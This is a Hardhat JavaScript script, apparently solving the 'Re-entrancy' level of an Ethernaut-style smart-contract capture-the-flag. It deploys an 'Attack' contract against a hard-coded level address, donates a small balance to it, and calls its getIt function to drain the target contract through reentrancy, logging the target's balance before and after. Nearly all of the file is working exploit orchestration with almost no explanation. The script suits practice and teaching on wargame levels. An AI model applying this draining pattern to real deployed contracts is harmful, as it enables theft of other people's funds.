// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const BigNumber = require('bignumber.js');
const { assert } = require("chai");

async function main() {

  const accounts = await hre.ethers.getSigners()
  let Level_Address = '0xd29842E82392e7a2b73bb3d8ba7D938e45124bab'
  const payer = accounts[0]

  // let Reentrance = await hre.ethers.getContractFactory('Reentrance')
  // let reentrance = await Reentrance.deploy()
  // await reentrance.deployed()
  // Level_Address = reentrance.address

  console.log('begin level',  Level_Address, 'payer', payer.address)
  
  let Attack = await hre.ethers.getContractFactory('Attack')
  let attack = await Attack.deploy(Level_Address)
  await attack.deployed()

  const abi = [
    // Read-Only Functions
    "function donate(address _to) public payable",
    "function balanceOf(address _who) public view returns (uint balance)",
    "function withdraw(uint _amount) public",
  ];
  const reenit = new hre.ethers.Contract(Level_Address, abi, payer);
  await reenit.donate(attack.address, {value:1000000000000020})
  let balance = await reenit.balanceOf(attack.address)
  console.log('balance', balance)
  console.log('begin balance', await attack.provider.getBalance(Level_Address))
  let tx = await attack.getIt(4, {gasLimit: 30000000})
  let txinfo = await tx.wait()
  console.log('getIt txhash', txinfo.blockNumber, txinfo.transactionHash)
  balance = await reenit.balanceOf(attack.address)
  console.log('balance', balance)
  console.log('final balance', await attack.provider.getBalance(Level_Address))
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });



  // npx hardhat run 10.Re-entrancy/run.js